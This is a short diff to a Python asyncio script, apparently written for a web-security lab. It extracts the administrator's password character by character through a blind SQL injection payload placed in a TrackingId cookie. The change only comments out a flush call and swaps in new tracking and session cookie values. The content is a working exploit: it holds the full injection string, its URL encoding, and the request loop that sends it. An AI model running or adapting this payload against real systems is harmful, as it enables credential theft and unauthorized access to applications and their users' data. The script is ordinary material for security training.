@@ -22,12 +22,12 @@ async def getChar(position, url, session):
     for j in range(32, 126):
         #sys.stdout.write("Trying char %s at pos %s\n" % (chr(j), position))
         #sys.stdout.write("password_extracted: %s" % password_extracted)
-        sys.stdout.flush()
+        #sys.stdout.flush()
         sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (position, j)
         sqli_payload_encoded = urllib.parse.quote(sqli_payload)
         cookies = {
-            "TrackingId": "7XS4c5L7eng2VT6o" + sqli_payload_encoded,
-            "session": "V9GFGbfEJ4GpzooL6cVFVCkWNkEWkXrU"
+            "TrackingId": "NGDLSDZiSdR4eDz7" + sqli_payload_encoded,
+            "session": "VHiFvAX0iQUSDNVVg8RXCqdwsg35F6zF"
         }
         async with session.get(url, cookies=cookies, ssl=False) as r:
             text = await r.text()
